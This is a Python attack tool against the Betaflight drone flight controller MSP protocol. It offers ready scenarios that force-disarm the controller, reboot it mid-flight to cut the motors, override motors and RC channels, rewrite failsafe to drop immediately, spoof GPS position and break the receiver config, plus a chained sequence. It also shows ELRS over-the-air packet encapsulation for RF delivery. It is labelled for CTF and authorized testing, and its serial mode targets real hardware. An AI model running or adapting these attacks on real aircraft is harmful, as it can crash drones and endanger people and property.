#!/usr/bin/env python3
"""
MSP Injection Simulator — validate MSP-over-ELRS attack chains against
Betaflight SITL or a TCP/serial MSP endpoint.

Betaflight's SITL (Software In The Loop) exposes the same MSP dispatcher as
real hardware over a TCP socket, allowing offline validation of every MSP
command the flight controller accepts.  This tool exercises the dangerous
MSP commands identified in the Betaflight 4.4.2 vulnerability audit and
MSP attack-surface analysis, confirming they work as documented without
needing live hardware or RF transmission.

Supported attack scenarios:
  1. force-disarm    — MSP_SET_ARMING_DISABLED (0xFB / 251)
  2. reboot          — MSP_REBOOT (0x44 / 68)
  3. motor-override  — MSP_SET_MOTOR (0xD6 / 214)
  4. failsafe-rewrite— MSP_SET_FAILSAFE_CONFIG (0x4C / 76)
  5. gps-spoof       — MSP_SET_RAW_GPS (0xC9 / 201)
  6. rx-config-write — MSP_SET_RX_CONFIG (0x2D / 45)
  7. rc-override     — MSP_SET_RAW_RC (0xC8 / 200)
  8. full-chain      — sequence: force-disarm → motor-override → reboot

Each scenario builds the MSP v1 frame, sends it to the endpoint, parses the
response, and reports whether the flight controller accepted the command.

The tool also demonstrates the ELRS OTA encapsulation path: how an MSP
payload would be split into 5-byte ELRS DATA packets for RF transmission,
using the v3-correct CRC and framing from elrs_core.  This encapsulation
is display-only; no RF is transmitted.

Requires:
    Python 3.10+
    For SITL mode: Betaflight SITL binary listening on TCP (default 127.0.0.1:5760)
    For serial mode: pyserial (pip install pyserial)

Usage:
    # Dry-run: show MSP frames without connecting (default)
    python3 msp-injection-sim.py --scenario force-disarm

    # All scenarios in dry-run
    python3 msp-injection-sim.py --scenario all

    # Connect to Betaflight SITL
    python3 msp-injection-sim.py --scenario force-disarm \\
        --target tcp:127.0.0.1:5760 --execute

    # Connect to serial MSP endpoint
    python3 msp-injection-sim.py --scenario reboot \\
        --target serial:/dev/ttyUSB0:115200 --execute

    # Show ELRS OTA encapsulation for a scenario
    python3 msp-injection-sim.py --scenario motor-override --show-ota \\
        --phrase "iloveflying" --ota-version 3

    # Full attack chain
    python3 msp-injection-sim.py --scenario full-chain \\
        --target tcp:127.0.0.1:5760 --execute

For CTF research and authorized security testing only.
"""

from __future__ import annotations

import argparse
import hashlib
import socket
import struct
import sys
import time
from dataclasses import dataclass
from typing import Sequence

# ---------------------------------------------------------------------------
# MSP v1 protocol constants (from Betaflight src/main/msp/msp_protocol.h)
# ---------------------------------------------------------------------------
MSP_HEADER = b"$M"
MSP_DIR_TO_FC = b"<"    # command (host → FC)
MSP_DIR_FROM_FC = b">"  # response (FC → host)
MSP_DIR_ERROR = b"!"    # error response

# Dangerous commands from the vulnerability audit
MSP_REBOOT = 68
MSP_SET_FAILSAFE_CONFIG = 76
MSP_SET_RX_CONFIG = 45
MSP_SET_RAW_RC = 200
MSP_SET_RAW_GPS = 201
MSP_SET_MOTOR = 214
MSP_SET_ARMING_DISABLED = 251

# Read-only commands for validation
MSP_API_VERSION = 1
MSP_FC_VARIANT = 2
MSP_FC_VERSION = 3
MSP_BOARD_INFO = 4
MSP_STATUS = 101
MSP_RC = 105
MSP_MOTOR = 104
MSP_ANALOG = 110

# CRSF/ELRS encapsulation constants
CRSF_FRAMETYPE_MSP_REQ = 0x7A
CRSF_FRAMETYPE_MSP_RESP = 0x7B
CRSF_FRAMETYPE_MSP_WRITE = 0x7C
CRSF_ADDRESS_FLIGHT_CONTROLLER = 0xC8
CRSF_ADDRESS_RADIO_TRANSMITTER = 0xEA

# ELRS DATA packet payload sizes (v3 std = 5 usable bytes)
ELRS_DATA_BYTES_PER_PACKET = 5


# ---------------------------------------------------------------------------
# MSP v1 framing
# ---------------------------------------------------------------------------
def msp_checksum(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
    return crc


def build_msp_command(cmd: int, payload: bytes = b"") -> bytes:
    """Build an MSP v1 command frame: $M< len cmd [payload] crc."""
    length = len(payload)
    body = bytes([length, cmd]) + payload
    crc = msp_checksum(body)
    return MSP_HEADER + MSP_DIR_TO_FC + body + bytes([crc])


def parse_msp_response(data: bytes) -> tuple[int, bytes, bool] | None:
    """Parse an MSP v1 response. Returns (cmd, payload, is_error) or None."""
    if len(data) < 6:
        return None
    if data[:2] != MSP_HEADER:
        return None

    is_error = data[2:3] == MSP_DIR_ERROR
    if not is_error and data[2:3] != MSP_DIR_FROM_FC:
        return None

    length = data[3]
    cmd = data[4]
    if len(data) < 5 + length + 1:
        return None

    payload = data[5 : 5 + length]
    expected_crc = msp_checksum(data[3 : 5 + length])
    actual_crc = data[5 + length]

    if expected_crc != actual_crc:
        return None

    return (cmd, payload, is_error)


# ---------------------------------------------------------------------------
# CRSF encapsulation for MSP-over-ELRS
# ---------------------------------------------------------------------------
def crsf_crc8(data: bytes) -> int:
    """CRSF CRC-8/DVB-S2 (poly 0xD5, init 0)."""
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0xD5) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def build_crsf_msp_frame(cmd: int, payload: bytes = b"") -> bytes:
    """Wrap an MSP command in a CRSF frame for ELRS transport.

    CRSF frame: [dest, len, type, origin, status, MSP_hdr..., crc8]
    The MSP header inside is: [flags, seq#, cmd, payload_size, payload...]
    """
    msp_flags = 0x00  # no sequence continuation
    msp_seq = 0
    msp_inner = bytes([msp_flags, msp_seq, cmd, len(payload)]) + payload
    frame_payload = bytes([
        CRSF_ADDRESS_FLIGHT_CONTROLLER,
        CRSF_ADDRESS_RADIO_TRANSMITTER,
    ]) + msp_inner
    frame_type = CRSF_FRAMETYPE_MSP_WRITE if payload else CRSF_FRAMETYPE_MSP_REQ
    frame_body = bytes([frame_type]) + frame_payload
    crc = crsf_crc8(frame_body)
    return bytes([CRSF_ADDRESS_FLIGHT_CONTROLLER, len(frame_body) + 1,
                  *frame_body, crc])


# ---------------------------------------------------------------------------
# ELRS OTA DATA packet splitting
# ---------------------------------------------------------------------------
def split_for_elrs_ota(crsf_frame: bytes, chunk_size: int = ELRS_DATA_BYTES_PER_PACKET) -> list[bytes]:
    """Split a CRSF MSP frame into ELRS DATA packet payloads.

    Each ELRS v3 std DATA packet carries 5 usable bytes (bytes 1-5 of the
    8-byte OTA frame, with byte 0 = type|seq and bytes 6-7 = switch/CRC).
    The first chunk starts with a sequence/continuation byte.
    """
    chunks: list[bytes] = []
    offset = 0
    seq = 0
    while offset < len(crsf_frame):
        remaining = len(crsf_frame) - offset
        is_last = remaining <= (chunk_size - 1)
        header = (seq & 0x0F)
        if not is_last:
            header |= 0x80  # continuation bit
        chunk_data = bytes([header]) + crsf_frame[offset : offset + chunk_size - 1]
        if len(chunk_data) < chunk_size:
            chunk_data += b"\x00" * (chunk_size - len(chunk_data))
        chunks.append(chunk_data)
        offset += chunk_size - 1
        seq += 1
    return chunks


# ---------------------------------------------------------------------------
# Attack scenario definitions
# ---------------------------------------------------------------------------
@dataclass
class AttackScenario:
    name: str
    description: str
    commands: list[tuple[int, bytes, str]]  # (cmd_code, payload, explanation)


def _le16(v: int) -> bytes:
    return struct.pack("<H", v & 0xFFFF)


def _le32(v: int) -> bytes:
    return struct.pack("<I", v & 0xFFFFFFFF)


def build_scenarios() -> dict[str, AttackScenario]:
    scenarios: dict[str, AttackScenario] = {}

    # 1. Force-disarm via MSP_SET_ARMING_DISABLED
    scenarios["force-disarm"] = AttackScenario(
        name="force-disarm",
        description="Disable arming via MSP_SET_ARMING_DISABLED (251). "
                    "Sets the MSP disable flag, preventing the FC from arming. "
                    "No ARMED check required — works in any state.",
        commands=[
            (MSP_SET_ARMING_DISABLED, bytes([1, 0, 0, 0]),
             "Set disableRunawayTakeoff=1 — blocks arming via MSP flag"),
        ],
    )

    # 2. Reboot
    scenarios["reboot"] = AttackScenario(
        name="reboot",
        description="Force FC reboot via MSP_REBOOT (68). Accepted in any "
                    "state including mid-flight. Immediate motor cutoff.",
        commands=[
            (MSP_REBOOT, bytes([0]),
             "Reboot type 0 = firmware reboot (instant motor stop)"),
        ],
    )

    # 3. Motor override
    motor_payload = bytearray()
    for i in range(8):
        if i < 4:
            motor_payload += _le16(1000)  # motors 1-4: minimum throttle
        else:
            motor_payload += _le16(0)     # motors 5-8: unused
    scenarios["motor-override"] = AttackScenario(
        name="motor-override",
        description="Direct motor control via MSP_SET_MOTOR (214). "
                    "Sets all motors to minimum throttle. In BF 4.4.2 the "
                    "MSP motor mixer path accepts values regardless of arming state.",
        commands=[
            (MSP_SET_MOTOR, bytes(motor_payload),
             "All 8 motors to 1000 (minimum / off) via direct mixer write"),
        ],
    )

    # 4. Failsafe rewrite
    # MSP_SET_FAILSAFE_CONFIG payload: see msp.c processInCommand
    # We set failsafe_delay to 0 (immediate) and procedure to PROC_DROP (0)
    failsafe_payload = bytearray()
    failsafe_payload += bytes([0])         # failsafe_delay = 0 (immediate trigger)
    failsafe_payload += bytes([0])         # failsafe_off_delay
    failsafe_payload += _le16(1000)        # failsafe_throttle (minimum)
    failsafe_payload += bytes([0])         # failsafe_switch_mode = 0
    failsafe_payload += _le16(0)           # failsafe_throttle_low_delay = 0
    failsafe_payload += bytes([0])         # failsafe_procedure = PROC_DROP (0)
    scenarios["failsafe-rewrite"] = AttackScenario(
        name="failsafe-rewrite",
        description="Rewrite failsafe config via MSP_SET_FAILSAFE_CONFIG (76). "
                    "Sets failsafe_delay=0 (immediate) and procedure=DROP. "
                    "Next signal loss triggers instant motor cutoff.",
        commands=[
            (MSP_SET_FAILSAFE_CONFIG, bytes(failsafe_payload),
             "Failsafe: delay=0, throttle=1000, procedure=DROP"),
        ],
    )

    # 5. GPS spoof
    gps_payload = bytearray()
    gps_payload += bytes([1])              # fix type = GPS_FIX (1)
    gps_payload += bytes([12])             # numSat = 12 (convincing)
    gps_payload += _le32(389500000)        # lat = 38.9500000 (DC area, scaled 1e7)
    gps_payload += _le32(-770500000 & 0xFFFFFFFF)  # lon = -77.0500000
    gps_payload += _le16(100)              # alt = 100m
    gps_payload += _le16(0)               # groundSpeed = 0
    scenarios["gps-spoof"] = AttackScenario(
        name="gps-spoof",
        description="Inject fake GPS position via MSP_SET_RAW_GPS (201). "
                    "Plants false coordinates. If GPS rescue is enabled, a "
                    "subsequent failsafe flies to the spoofed position.",
        commands=[
            (MSP_SET_RAW_GPS, bytes(gps_payload),
             "Inject GPS: fix=1, sats=12, lat=38.95, lon=-77.05, alt=100m"),
        ],
    )

    # 6. RX config write
    # Minimal payload to flip the serialrx_provider field
    # MSP_SET_RX_CONFIG: first byte is serialrx_provider
    rx_payload = bytearray()
    rx_payload += bytes([0])   # serialrx_provider = SPEK1024 (0) — break ELRS!
    rx_payload += _le16(1500)  # maxcheck
    rx_payload += _le16(1500)  # midrc
    rx_payload += _le16(885)   # mincheck
    rx_payload += bytes([0])   # spektrum_sat_bind
    rx_payload += _le16(1100)  # rx_min_usec
    rx_payload += _le16(1900)  # rx_max_usec
    rx_payload += bytes([0])   # rcInterpolation
    rx_payload += bytes([0])   # rcInterpolationInterval
    rx_payload += _le16(0)     # airModeActivateThreshold
    rx_payload += bytes([0])   # rx_spi_protocol
    rx_payload += _le32(0)     # rx_spi_id
    rx_payload += bytes([0])   # rx_spi_rf_channel_count
    rx_payload += bytes([0])   # fpvCamAngleDegrees
    rx_payload += bytes([0])   # rcInterpolationChannels
    rx_payload += bytes([0])   # rc_smoothing_type (removed in BF4, but field exists)
    rx_payload += bytes([0])   # rc_smoothing_input_cutoff
    scenarios["rx-config-write"] = AttackScenario(
        name="rx-config-write",
        description="Overwrite RX config via MSP_SET_RX_CONFIG (45). "
                    "Changing serialrx_provider from ELRS to SPEK1024 breaks "
                    "the receiver protocol. Requires EEPROM write + reboot "
                    "to persist, but the in-RAM change is immediate.",
        commands=[
            (MSP_SET_RX_CONFIG, bytes(rx_payload),
             "Set serialrx_provider=0 (SPEK1024) — breaks ELRS link"),
        ],
    )

    # 7. RC override
    rc_channels = [1500] * 4 + [1000] * 4  # center sticks, low aux
    rc_payload = bytearray()
    for ch in rc_channels:
        rc_payload += _le16(ch)
    scenarios["rc-override"] = AttackScenario(
        name="rc-override",
        description="Direct RC channel injection via MSP_SET_RAW_RC (200). "
                    "Overwrites the FC's rcData[] array, bypassing the actual "
                    "receiver. Effect lasts until the next valid RX packet.",
        commands=[
            (MSP_SET_RAW_RC, bytes(rc_payload),
             "Set 8 channels: sticks centered, aux low (disarmed)"),
        ],
    )

    # 8. Full attack chain
    scenarios["full-chain"] = AttackScenario(
        name="full-chain",
        description="Multi-step attack: (1) force-disarm to prevent re-arm, "
                    "(2) motor override to minimum, (3) reboot for good measure. "
                    "Each command is independent — partial success still degrades.",
        commands=[
            scenarios["force-disarm"].commands[0],
            scenarios["motor-override"].commands[0],
            scenarios["reboot"].commands[0],
        ],
    )

    return scenarios


# ---------------------------------------------------------------------------
# Transport backends
# ---------------------------------------------------------------------------
class Transport:
    """Abstract MSP transport."""

    def send_recv(self, frame: bytes, timeout: float = 2.0) -> bytes | None:
        raise NotImplementedError

    def close(self) -> None:
        pass


class TcpTransport(Transport):
    """TCP connection to Betaflight SITL."""

    def __init__(self, host: str, port: int):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(5.0)
        self.sock.connect((host, port))
        print(f"  Connected to SITL at {host}:{port}", file=sys.stderr)

    def send_recv(self, frame: bytes, timeout: float = 2.0) -> bytes | None:
        self.sock.settimeout(timeout)
        self.sock.sendall(frame)
        try:
            resp = self.sock.recv(256)
            return resp if resp else None
        except socket.timeout:
            return None

    def close(self) -> None:
        self.sock.close()


class SerialTransport(Transport):
    """Serial port MSP connection."""

    def __init__(self, port: str, baud: int = 115200):
        try:
            import serial  # type: ignore[import-untyped]
        except ImportError:
            print("ERROR: pyserial not installed (pip install pyserial)",
                  file=sys.stderr)
            sys.exit(1)
        self.ser = serial.Serial(port, baud, timeout=2.0)
        print(f"  Connected to {port} at {baud} baud", file=sys.stderr)

    def send_recv(self, frame: bytes, timeout: float = 2.0) -> bytes | None:
        self.ser.timeout = timeout
        self.ser.write(frame)
        # Read until we get a complete MSP response or timeout
        resp = self.ser.read(256)
        return resp if resp else None

    def close(self) -> None:
        self.ser.close()


class DryRunTransport(Transport):
    """No connection — just show what would be sent."""

    def send_recv(self, frame: bytes, timeout: float = 2.0) -> bytes | None:
        return None


def open_transport(target: str, execute: bool) -> Transport:
    if not execute:
        return DryRunTransport()

    if target.startswith("tcp:"):
        parts = target[4:].split(":")
        host = parts[0]
        port = int(parts[1]) if len(parts) > 1 else 5760
        return TcpTransport(host, port)
    elif target.startswith("serial:"):
        parts = target[7:].split(":")
        port = parts[0]
        baud = int(parts[1]) if len(parts) > 1 else 115200
        return SerialTransport(port, baud)
    else:
        print(f"ERROR: unknown target scheme: {target}", file=sys.stderr)
        print("  Use tcp:host:port or serial:/dev/ttyX:baud", file=sys.stderr)
        sys.exit(1)


# ---------------------------------------------------------------------------
# ELRS OTA display (no RF, just shows the encapsulation)
# ---------------------------------------------------------------------------
def show_ota_encapsulation(scenario: AttackScenario, phrase: str,
                           ota_version: int) -> None:
    """Display how each MSP command would be encapsulated for ELRS OTA."""
    uid = hashlib.md5(phrase.encode()).digest()[:6]
    print(f"\n{'='*60}")
    print(f"ELRS OTA Encapsulation (v{ota_version}, phrase={phrase!r})")
    print(f"  UID: {uid.hex()}")

    # Import v3_compat for version-correct parameters
    try:
        tools_dir = __import__("os").path.dirname(__import__("os").path.abspath(__file__))
        sys.path.insert(0, tools_dir)
        from elrs_core.v3_compat import uid_crc_init, uid_fhss_seed, sync_channel
        crc_init = uid_crc_init(uid, ota_version)
        seed = uid_fhss_seed(uid, ota_version)
        sync_ch = sync_channel(80, ota_version)
        print(f"  CRC init: 0x{crc_init:04X}")
        print(f"  FHSS seed: 0x{seed:08X}")
        print(f"  Sync channel: {sync_ch}")
    except ImportError:
        print("  (elrs_core not available — showing CRSF framing only)")
        crc_init = None

    for cmd_code, payload, explanation in scenario.commands:
        crsf = build_crsf_msp_frame(cmd_code, payload)
        chunks = split_for_elrs_ota(crsf)

        print(f"\n  MSP cmd {cmd_code} ({explanation})")
        print(f"    CRSF frame ({len(crsf)} bytes): {crsf.hex()}")
        print(f"    ELRS DATA packets needed: {len(chunks)}")
        for i, chunk in enumerate(chunks):
            cont = "+" if chunk[0] & 0x80 else " "
            seq = chunk[0] & 0x0F
            print(f"      [{i}] seq={seq} cont={cont} data={chunk.hex()}")

        if crc_init is not None:
            # Show timing: at 150 Hz, one packet every 6.667 ms
            tx_time_ms = len(chunks) * (1000.0 / 150.0)
            print(f"    TX time at 150 Hz: {tx_time_ms:.1f} ms "
                  f"({len(chunks)} slots)")

    print(f"{'='*60}\n")


# ---------------------------------------------------------------------------
# Scenario execution
# ---------------------------------------------------------------------------
def run_scenario(scenario: AttackScenario, transport: Transport,
                 execute: bool, delay: float = 0.1) -> list[dict]:
    """Execute a scenario's commands and return results."""
    results = []
    print(f"\n{'='*60}", file=sys.stderr)
    print(f"Scenario: {scenario.name}", file=sys.stderr)
    print(f"  {scenario.description}", file=sys.stderr)
    print(f"{'='*60}", file=sys.stderr)

    for i, (cmd_code, payload, explanation) in enumerate(scenario.commands):
        frame = build_msp_command(cmd_code, payload)
        result: dict = {
            "step": i + 1,
            "command": cmd_code,
            "explanation": explanation,
            "frame_hex": frame.hex(),
            "frame_len": len(frame),
            "payload_len": len(payload),
        }

        print(f"\n  Step {i+1}: MSP cmd {cmd_code} — {explanation}",
              file=sys.stderr)
        print(f"    Frame ({len(frame)} bytes): {frame.hex()}", file=sys.stderr)

        if not execute:
            print(f"    [DRY RUN] Would send {len(frame)} bytes", file=sys.stderr)
            result["status"] = "dry_run"
            results.append(result)
            continue

        resp_raw = transport.send_recv(frame)
        if resp_raw is None:
            print(f"    [TIMEOUT] No response", file=sys.stderr)
            result["status"] = "timeout"
            results.append(result)
            continue

        result["response_hex"] = resp_raw.hex()
        parsed = parse_msp_response(resp_raw)
        if parsed is None:
            print(f"    [ERROR] Unparseable response: {resp_raw.hex()}",
                  file=sys.stderr)
            result["status"] = "parse_error"
        else:
            resp_cmd, resp_payload, is_error = parsed
            result["response_cmd"] = resp_cmd
            result["response_payload_hex"] = resp_payload.hex()
            result["is_error"] = is_error
            if is_error:
                print(f"    [REJECTED] FC returned error for cmd {resp_cmd}",
                      file=sys.stderr)
                result["status"] = "rejected"
            else:
                print(f"    [ACCEPTED] FC acknowledged cmd {resp_cmd} "
                      f"({len(resp_payload)} bytes response)", file=sys.stderr)
                result["status"] = "accepted"

        results.append(result)
        if i < len(scenario.commands) - 1:
            time.sleep(delay)

    return results


def probe_endpoint(transport: Transport) -> dict | None:
    """Send MSP_API_VERSION to identify the endpoint."""
    frame = build_msp_command(MSP_API_VERSION)
    resp = transport.send_recv(frame)
    if resp is None:
        return None
    parsed = parse_msp_response(resp)
    if parsed is None:
        return None
    cmd, payload, is_error = parsed
    if is_error or len(payload) < 3:
        return None
    return {
        "msp_protocol": payload[0],
        "api_major": payload[1],
        "api_minor": payload[2],
    }


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    scenarios = build_scenarios()

    parser = argparse.ArgumentParser(
        description="MSP Injection Simulator — validate MSP-over-ELRS attack chains",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.",
    )
    parser.add_argument(
        "--scenario", required=True,
        choices=list(scenarios.keys()) + ["all", "list"],
        help="Attack scenario to run (or 'all' for every scenario, 'list' to show them)",
    )
    parser.add_argument(
        "--target", default="tcp:127.0.0.1:5760",
        help="MSP endpoint: tcp:host:port or serial:/dev/ttyX:baud (default: tcp:127.0.0.1:5760)",
    )
    parser.add_argument(
        "--execute", action="store_true",
        help="Actually connect and send commands (default: dry-run)",
    )
    parser.add_argument(
        "--show-ota", action="store_true",
        help="Show ELRS OTA encapsulation (DATA packet splitting)",
    )
    parser.add_argument(
        "--phrase", default="iloveflying",
        help="Binding phrase for OTA encapsulation display (default: iloveflying)",
    )
    parser.add_argument(
        "--ota-version", type=int, default=3, choices=[3, 4],
        help="ELRS OTA version for encapsulation display (default: 3)",
    )
    parser.add_argument(
        "--delay", type=float, default=0.1,
        help="Delay between commands in a multi-step scenario (seconds, default: 0.1)",
    )
    parser.add_argument(
        "--probe", action="store_true",
        help="Probe the endpoint with MSP_API_VERSION before running scenarios",
    )

    args = parser.parse_args()

    # List scenarios
    if args.scenario == "list":
        print("Available attack scenarios:\n")
        for name, sc in scenarios.items():
            print(f"  {name:20s}  {sc.description[:70]}")
            for cmd_code, _, expl in sc.commands:
                print(f"    {'':20s}  MSP {cmd_code}: {expl}")
            print()
        return

    # Determine which scenarios to run
    if args.scenario == "all":
        to_run = [s for name, s in scenarios.items() if name != "full-chain"]
    else:
        to_run = [scenarios[args.scenario]]

    # Show OTA encapsulation if requested
    if args.show_ota:
        for sc in to_run:
            show_ota_encapsulation(sc, args.phrase, args.ota_version)

    # Open transport
    transport = open_transport(args.target, args.execute)

    try:
        # Probe endpoint
        if args.execute and args.probe:
            print("\nProbing endpoint...", file=sys.stderr)
            info = probe_endpoint(transport)
            if info:
                print(f"  MSP protocol: {info['msp_protocol']}", file=sys.stderr)
                print(f"  API version: {info['api_major']}.{info['api_minor']}",
                      file=sys.stderr)
            else:
                print("  WARNING: endpoint did not respond to MSP_API_VERSION",
                      file=sys.stderr)
                print("  Continuing anyway...", file=sys.stderr)

        # Run scenarios
        all_results = []
        for sc in to_run:
            results = run_scenario(sc, transport, args.execute, args.delay)
            all_results.extend(results)

        # Summary
        print(f"\n{'='*60}", file=sys.stderr)
        print("Summary:", file=sys.stderr)
        accepted = sum(1 for r in all_results if r["status"] == "accepted")
        rejected = sum(1 for r in all_results if r["status"] == "rejected")
        timeout = sum(1 for r in all_results if r["status"] == "timeout")
        dry = sum(1 for r in all_results if r["status"] == "dry_run")
        errors = sum(1 for r in all_results if r["status"] == "parse_error")

        if dry:
            print(f"  Dry-run: {dry} commands shown (use --execute to send)",
                  file=sys.stderr)
        if accepted:
            print(f"  Accepted: {accepted} commands", file=sys.stderr)
        if rejected:
            print(f"  Rejected: {rejected} commands", file=sys.stderr)
        if timeout:
            print(f"  Timeout: {timeout} commands", file=sys.stderr)
        if errors:
            print(f"  Parse errors: {errors} responses", file=sys.stderr)
        print(f"{'='*60}", file=sys.stderr)

    finally:
        transport.close()


if __name__ == "__main__":
    main()
